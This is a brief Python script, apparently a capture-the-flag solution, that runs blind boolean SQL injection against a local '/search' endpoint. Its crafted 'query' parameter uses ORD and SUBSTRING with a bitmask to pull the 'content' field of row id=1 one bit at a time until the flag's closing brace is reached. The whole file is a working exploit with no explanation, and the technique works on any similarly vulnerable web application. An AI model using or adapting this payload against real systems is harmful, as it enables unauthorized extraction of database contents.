import requests
import os

PORT = os.environ.get("PORT", "9999")
URL = "http://localhost:{port}/search".format(port=PORT)

flag = ""
while True:
    bit = ""
    for i in range(7):
        params = {
            "query": "XX' OR (ORD(SUBSTRING(content,{},1)) & {}) > 0 AND id=1 OR title='XX".format(
                len(flag) + 1, 1 << i
            )
        }
        r = requests.get(URL, params=params)
        if "1 post" in r.text:
            bit += "1"
        else:
            bit += "0"
    flag += chr(int(bit[::-1], 2))
    print(flag)
    if flag[-1] == "}":
        break
